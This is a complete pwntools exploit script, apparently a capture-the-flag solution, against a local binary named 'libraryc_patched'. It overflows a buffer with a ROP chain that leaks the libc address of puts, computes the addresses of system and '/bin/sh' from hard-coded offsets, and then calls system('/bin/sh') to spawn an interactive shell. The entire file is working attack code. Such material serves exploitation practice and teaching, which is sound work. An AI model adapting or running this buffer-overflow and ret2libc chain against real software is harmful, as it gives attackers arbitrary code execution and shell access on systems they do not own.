from pwn import *

# setup the binary
elf = ELF("./libraryc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

p = process("./libraryc_patched")
context.binary = elf


# leaking puts@libc
payload = b'A' * 72 # padding
payload += p64(0x400653) # pop rdi ; ret
payload += p64(0x601018) # puts@GOT into the function argument
payload += p64(0x400490) # puts@plt
payload += p64(0x4005a7) # return to main so we can see output
p.sendline(payload) 

# puts@libc leak
p.recvuntil("make it!\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("puts@libc leak address: " + hex(leak))

# look for offsets
# objdump -T libc.so.6 | grep -E "(system$|puts$)"
libc_puts_offset = 0x87bd0
libc_system_offset = 0x58740

# strings -t x libc.so.6 | grep "/bin/sh"
sh_offset = 0x1cb42f


# calculate for libc base address first
# then calculate for system address and /bin/sh address
libcbase = leak - libc_puts_offset
system = libcbase + libc_system_offset
sh = libcbase + sh_offset

payload2 = b'A' * 72 # padding again
payload2 += p64(0x400653) # pop rdi ; ret
payload2 += p64(sh) # shell as argument
payload2 += p64(0x400476) # stack alignment (ROP for ret instr)
payload2 += p64(system) # system calls shell: system(/bin/sh)

# final
p.sendline(payload2)
p.interactive()